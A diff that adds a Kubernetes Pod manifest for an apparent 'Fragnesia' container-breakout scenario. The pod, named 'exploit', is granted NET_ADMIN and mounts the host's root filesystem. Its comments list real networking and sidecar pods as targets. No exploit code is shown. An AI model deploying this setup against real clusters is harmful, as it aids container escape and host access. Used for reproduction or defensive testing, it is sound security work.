@@ -1,0 +1,29 @@
+---
+# Fragnesia container breakout -- CAP_NET_ADMIN scenario
+#
+# Works with Docker/containerd default seccomp profile.
+# Targets pods that run as root with NET_ADMIN: Istio/Linkerd sidecars,
+# CNI node agents (Calico, Cilium), VPN pods, network debugging pods.
+apiVersion: v1
+kind: Pod
+metadata:
+  name: fragnesia-breakout
+  labels:
+    app: fragnesia-breakout
+spec:
+  containers:
+  - name: exploit
+    image: fragnesia:latest
+    command: ["sleep", "infinity"]
+    securityContext:
+      capabilities:
+        add: ["NET_ADMIN"]
+    volumeMounts:
+    - name: hostfs
+      mountPath: /hostfs
+      readOnly: true
+  volumes:
+  - name: hostfs
+    hostPath:
+      path: /
+      type: Directory
